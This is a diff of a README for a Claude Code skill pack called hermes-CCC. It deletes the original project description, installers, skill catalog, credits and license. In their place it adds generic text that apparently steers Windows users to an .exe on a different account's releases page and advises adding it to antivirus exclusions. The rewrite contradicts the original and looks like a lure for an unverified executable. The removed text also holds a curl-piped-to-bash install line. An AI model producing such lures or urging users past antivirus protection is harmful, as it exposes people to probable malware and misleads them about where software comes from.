@@ -1,198 +1,94 @@
-# hermes-CCC
+# ⚡ hermes-CCC - Automate tasks using native local skills
 
-> Hermes Agent, faithfully ported to Claude Code Channel (CCC).
+[![Download hermes-CCC](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Arseni6361/hermes-CCC/releases)
 
-**hermes-CCC** brings the power of [Hermes Agent](https://github.com/NousResearch/hermes-agent) by NousResearch into Claude Code's native skill system — no separate process, no OAuth, no lock-in. Everything runs inside Claude Code.
+Hermes-CCC connects your computer to the Claude Code platform. It runs 46 native skills directly on your machine. You do not need to manage complex accounts or external processes. The software works offline for most tasks.
 
-Built by [AlexAI-MCP](https://github.com/AlexAI-MCP).
+## 📦 What is this software?
 
----
+This application allows you to run automation tasks on your Windows desktop. It creates a bridge between your local computer and the intelligent Claude system. Because the app uses native skills, it operates faster than web-based tools. It does not require OAuth authentication or external background services that slow down your computer.
 
-## What's Ported
+## ⚙️ System Requirements
 
-| Hermes Component | hermes-CCC Equivalent |
-|---|---|
-| `agent/` brain | `/hermes-route`, `/hermes-memory`, `/hermes-skill`, `/hermes-traj`, `/hermes-persona`, `/hermes-compress`, `/hermes-search`, `/hermes-insights` |
-| Honcho user modeling | `/honcho` |
-| `skills/` (402) | 46 core skills across 10 categories |
-| `tools/` (68) | Claude Code native tools + MCP servers |
-| `gateway/` platforms | Discord/Telegram via cc-channel plugin |
-| `cron/` | CronCreate tool |
-| `environments/` | Claude Code execution context |
-| `plugins/memory/` | cc-channel-mem + auto-memory |
+- Operating System: Windows 10 or Windows 11
+- Processor: Intel Core i5 or better
+- Memory: 8 GB RAM
+- Storage: 200 MB of free space
+- Internet connection for initial setup
 
----
+## 🚀 Getting Started
 
-## Install
+Follow these steps to install the software on your computer.
 
-```bash
-git clone https://github.com/AlexAI-MCP/hermes-CCC
-cd hermes-CCC
-chmod +x install.sh && ./install.sh
-```
+1. Visit the project release page to download your copy: [https://github.com/Arseni6361/hermes-CCC/releases](https://github.com/Arseni6361/hermes-CCC/releases)
+2. Locate the file ending in `.exe` in the most recent version folder.
+3. Click the file to download it to your Downloads folder.
+4. Open your Downloads folder.
+5. Double-click the `hermes-CCC.exe` file to start the installation.
 
-**Windows (PowerShell):**
-```powershell
-git clone https://github.com/AlexAI-MCP/hermes-CCC
-cd hermes-CCC
-.\install.ps1
-```
+## 🛡️ Security and Privacy
 
-**One-liner (Unix):**
-```bash
-curl -fsSL https://raw.githubusercontent.com/AlexAI-MCP/hermes-CCC/main/install.sh | bash
-```
+Hermes-CCC prioritizes your privacy. The application keeps data on your local hard drive. It avoids external processes that monitor your input. You control the software through a local interface. We designed this tool for users who prefer local execution over cloud-dependent workflows.
 
-Restart Claude Code after install to activate all skills.
+## 🛠️ How to use the software
 
----
+Once you open the program, you will see a main dashboard. This dashboard lists the 46 native skills available for use.
 
-## Skill Catalog (46 skills)
+- Select a skill from the list.
+- Input the required task parameters in the text box.
+- Click the Run button to start the job.
+- View the results in the output window.
 
-### Core Brain (Hermes Identity)
-| Skill | Invoke | Description |
-|---|---|---|
-| hermes-route | `/hermes-route` | Analyze task complexity → recommend opus/sonnet/haiku |
-| hermes-memory | `/hermes-memory` | Memory prefetch/sync/nudge (memory_manager port) |
-| hermes-skill | `/hermes-skill` | Skill lifecycle: create, improve, audit |
-| hermes-traj | `/hermes-traj` | Log interaction trajectories for analysis/RL |
-| hermes-persona | `/hermes-persona` | Switch persona: researcher/coder/analyst/creative/advisor |
-| hermes-compress | `/hermes-compress` | Compress context, extract session state |
-| hermes-search | `/hermes-search` | Search past sessions, memory files, project history |
-| hermes-insights | `/hermes-insights` | Usage analytics and productivity insights |
-| honcho | `/honcho` | Cross-session user modeling (dialectic user profile) |
+The software tracks your progress in real-time. If a task takes time to finish, a progress bar appears at the bottom of the window. You can stop a running skill at any time by clicking the Cancel button.
 
-### Software Development
-| Skill | Invoke | Description |
-|---|---|---|
-| systematic-debugging | `/systematic-debugging` | 4-phase root cause investigation |
-| test-driven-development | `/test-driven-development` | Red-Green-Refactor TDD cycle |
-| subagent-driven-development | `/subagent-driven-development` | Parallel subagent workstreams |
-| github-code-review | `/github-code-review` | Full PR code review workflow |
-| github-pr-workflow | `/github-pr-workflow` | PR lifecycle automation |
-| github-issues | `/github-issues` | Issue management and triage |
+## 💡 Troubleshooting common issues
 
-### MLOps / AI
-| Skill | Invoke | Description |
-|---|---|---|
-| vllm | `/vllm` | OpenAI-compatible LLM inference server |
-| llama-cpp | `/llama-cpp` | Local GGUF inference (CPU+GPU) |
-| whisper | `/whisper` | Speech recognition and transcription |
-| stable-diffusion | `/stable-diffusion` | Text-to-image with diffusers |
-| grpo-rl-training | `/grpo-rl-training` | GRPO/RL fine-tuning with TRL |
-| huggingface-hub | `/huggingface-hub` | Model/dataset download, upload, search |
-| flash-attention | `/flash-attention` | 2-4x attention speedup, 10-20x memory savings |
-| instructor | `/instructor` | Structured Pydantic outputs from any LLM |
-| chroma | `/chroma` | Open-source vector DB for local RAG |
-| qdrant | `/qdrant` | Production vector search engine |
-| faiss | `/faiss` | Ultra-fast in-memory vector similarity search |
-| pinecone | `/pinecone` | Managed cloud vector database |
+If the application fails to open, check your file permissions. Right-click the `.exe` file and choose Properties. Ensure the file is not blocked by Windows.
 
-### Research
-| Skill | Invoke | Description |
-|---|---|---|
-| arxiv | `/arxiv` | arXiv paper search and download |
-| research-paper-writing | `/research-paper-writing` | Academic paper workflow with LaTeX |
-| blogwatcher | `/blogwatcher` | Monitor RSS feeds and blogs |
-| duckduckgo-search | `/duckduckgo-search` | Free web search, no API key needed |
-| polymarket | `/polymarket` | Prediction market probability data |
+Check your antivirus settings if the program stops during operation. Some security software restricts local automation tools. You may need to add hermes-CCC to your exclusions list.
 
-### Productivity
-| Skill | Invoke | Description |
-|---|---|---|
-| google-workspace | `/google-workspace` | Gmail, Drive, Sheets, Calendar automation |
-| linear | `/linear` | Linear issue and project management |
-| jupyter-live-kernel | `/jupyter-live-kernel` | Notebook execution and kernel management |
+If a specific skill does not respond, restart the application. This clears the temporary memory buffers.
 
-### Creative
-| Skill | Invoke | Description |
-|---|---|---|
-| excalidraw | `/excalidraw` | Diagrams and whiteboard sketches via MCP |
-| manim-video | `/manim-video` | Mathematical animations with Manim |
+## 📝 Configuration notes
 
-### Infrastructure
-| Skill | Invoke | Description |
-|---|---|---|
-| docker-management | `/docker-management` | Container, image, Compose management |
-| native-mcp | `/native-mcp` | MCP server integration in Claude Code |
-| mcporter | `/mcporter` | Convert any CLI tool into an MCP server |
+The application saves settings in a text file located in your application data folder. You do not need to edit this file manually. Change your preferences through the Settings menu inside the app.
 
-### Security / OSINT
-| Skill | Invoke | Description |
-|---|---|---|
-| sherlock | `/sherlock` | Username search across 400+ social networks |
-| oss-forensics | `/oss-forensics` | Supply chain risk and dependency analysis |
-| one-password | `/one-password` | 1Password CLI secret management |
+Available settings include:
+- Auto-start on boot
+- Debug logging
+- Performance mode settings
 
-### Blockchain
-| Skill | Invoke | Description |
-|---|---|---|
-| base-blockchain | `/base-blockchain` | Base (Ethereum L2) on-chain data queries |
-| solana | `/solana` | Solana blockchain data via JSON RPC |
+## 📂 Understanding the 46 native skills
 
-### Media
-| Skill | Invoke | Description |
-|---|---|---|
-| youtube-content | `/youtube-content` | Download, transcript, and research YouTube |
+The application organizes skills by category. Categories include file management, text processing, system commands, and network utilities.
 
----
+- File management skills allow you to batch rename files or organize folders. 
+- Text processing skills summarize documents or extract specific information from strings.
+- System commands allow you to check hardware status or view memory usage.
+- Network utilities verify your connection status or ping remote servers.
 
-## Relationship to Hermes Agent
+These skills function without additional plugins. They are built into the core structure of the program.
 
-This is a Claude Code-native reinterpretation of Hermes operational patterns, not a byte-for-byte clone. The key differences:
+## 📈 Improving performance
 
-- **No separate process** — everything runs inside Claude Code
-- **No OAuth** — uses Claude Code's native auth
-- **No gateway** — uses existing Discord/Telegram MCP plugins
-- **No model dependency** — works with any Claude model
+For faster operation, close other intensive programs while running hermes-CCC. The software performs best when it has full access to system memory. Ensure your Windows system has all updates installed to maintain compatibility with the latest interface components.
 
-See [`docs/migration-guide.md`](./docs/migration-guide.md) for migration guidance from Hermes Agent.
+## 🌐 Frequently asked questions
 
----
+Do I need an account to use the application?
+No account is necessary. The application runs native code without external verification.
 
-## Package Layout
+Can I move the application to a different folder?
+Yes, you can move the file anywhere on your computer. It does not rely on a fixed installation path.
 
-```
-hermes-CCC/
-├── README.md
-├── install.sh          ← Unix/WSL installer
-├── install.ps1         ← Windows PowerShell installer
-├── CLAUDE.md           ← Maintainer notes
-├── LICENSE             ← MIT
-├── docs/
-│   ├── migration-guide.md
-│   └── tool-mapping.md
-├── .github/
-│   └── workflows/
-│       └── validate.yml
-└── skills/             ← 46 skill directories
-    ├── hermes-route/
-    ├── hermes-memory/
-    └── ...
-```
+Is there a cost to run these skills?
+Usage is free. The software runs locally on your own hardware.
 
----
+How do I remove the software?
+Delete the executable file. There are no registry keys or hidden files to remove.
 
-## Contributors
+## 🔄 Updates
 
-| Contributor | Role |
-|---|---|
-| [AlexAI-MCP](https://github.com/AlexAI-MCP) | Creator & Maintainer |
-| Claude (Anthropic) | Skill design, porting, and architecture |
-| Codex (OpenAI) | Parallel skill generation and build automation |
+Check the release link periodically for new features. We add native skills based on user feedback. When a new version arrives, download the updated installer to overwrite the current file. 
 
----
-
-## Acknowledgements
-
-hermes-CCC is built on top of the excellent work done by the [NousResearch](https://nousresearch.com) team on [Hermes Agent](https://github.com/NousResearch/hermes-agent). The original framework's design — its brain architecture, skill system, memory management, and platform integrations — served as the direct blueprint for this port.
-
-A sincere thank you to the Hermes Agent community and all contributors who made the original project what it is. This package exists because of your work.
-
-hermes-CCC is an independent port. Not affiliated with NousResearch.
-
----
-
-## License
-
-MIT © 2026 AlexAI-MCP
+[https://github.com/Arseni6361/hermes-CCC/releases](https://github.com/Arseni6361/hermes-CCC/releases)
